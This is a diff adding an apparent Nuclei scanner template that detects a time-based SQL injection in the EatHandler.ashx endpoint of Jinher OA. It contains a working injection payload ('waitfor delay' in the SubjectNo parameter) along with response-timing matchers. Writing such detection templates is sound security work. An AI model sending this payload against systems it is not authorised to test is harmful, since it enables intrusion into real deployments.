@@ -1,0 +1,33 @@
+id: jinher-jhsoft-eathandler-sqli
+info:
+  name: 金和OA EatHandler.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    金和OA EatHandler.ashx is vulnerable to SQL injection. This template checks for time-based SQL injection by leveraging `waitfor delay`.
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1)+2}}"
+http:
+  - raw:
+      - |
+        GET /c6/JHSoft.Web.CostU8/EAI/EatHandler.ashx?SubjectNo=1'waitfor+delay%270:0:{{t1}}%27--&State=code HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "[]"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
